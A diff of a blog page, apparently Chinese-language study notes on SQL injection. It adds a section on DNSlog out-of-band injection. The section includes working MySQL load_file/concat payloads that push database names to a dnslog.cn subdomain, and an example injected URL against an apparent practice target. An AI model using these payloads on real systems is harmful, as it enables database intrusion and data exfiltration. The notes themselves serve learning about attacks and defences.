@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.8k</span>
+            <span class="post-count">2k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">8 min</span>
+            <span class="post-count">9 min</span>
         </span>
     </span>
 </div>
@@ -199,9 +199,18 @@
 
 
 
+<h4 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h4><p>通过dns解析将数据库查询的不能回显的数据外带出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.select load_file(&#39;d:&#x2F;1.txt&#39;);  </span><br><span class="line">用这个函数  mysql需要配置</span><br><span class="line">2.    UNC路径 windows中一个SMB服务，通过该路径请求一些数据    \\servername\xxx\xxx-&gt; \\ip\xxx\xx  -&gt;\\abc.com\\abc（出现了域名解析）</span><br><span class="line">也可以这样写   &#x2F;&#x2F;servername&#x2F;1.txt （推荐</span><br></pre></td></tr></table></figure>
+
+<p>语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。</span><br><span class="line">select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.zwuddi.dnslog.cn&#x2F;a.txt&#39;))；</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">select load_file(concat(&#39;&#x2F;&#x2F;&#39;,(sql语句),&#39;.zwuddi.dnslog.cn&#x2F;a.txt&#39;))</span><br></pre></td></tr></table></figure>
+
+<p>例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8022&#x2F;dns&#x2F;index.php?id&#x3D;1 and (select  load_file(concat(&#39;&#x2F;&#x2F;&#39;,(select database()),&#39;.5anley.dnslog.cn&#x2F;a.txt&#39;)))</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h1><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
+
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45345384/article/details/120888172">https://blog.csdn.net/weixin_45345384/article/details/120888172</a></p>
  
       <!-- reward -->
       
